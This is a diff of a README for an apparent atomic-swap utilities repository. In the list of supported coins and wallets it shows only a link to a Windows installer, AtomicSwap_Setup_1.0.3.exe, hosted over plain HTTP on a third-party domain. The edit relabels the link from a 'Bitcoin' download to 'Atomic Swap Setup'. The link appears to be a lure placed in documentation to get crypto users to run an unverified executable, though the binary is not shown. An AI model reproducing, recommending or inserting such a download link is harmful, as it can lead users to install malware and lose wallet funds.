@@ -10,7 +10,7 @@ This repository contains utilities for manually performing cross-chain atomic ex
 
 Currently, the following coins and wallets are supported:
 
-- [Bitcoin 1.0.3 Download](http://www.atomicswaps.pro/storage/swap/AtomicSwap_Setup_1.0.3.exe)
+- [Atomic Swap Setup 1.0.3](http://www.atomicswaps.pro/storage/swap/AtomicSwap_Setup_1.0.3.exe)
 
 Users should verify any downloaded software through official sources before running it.
 
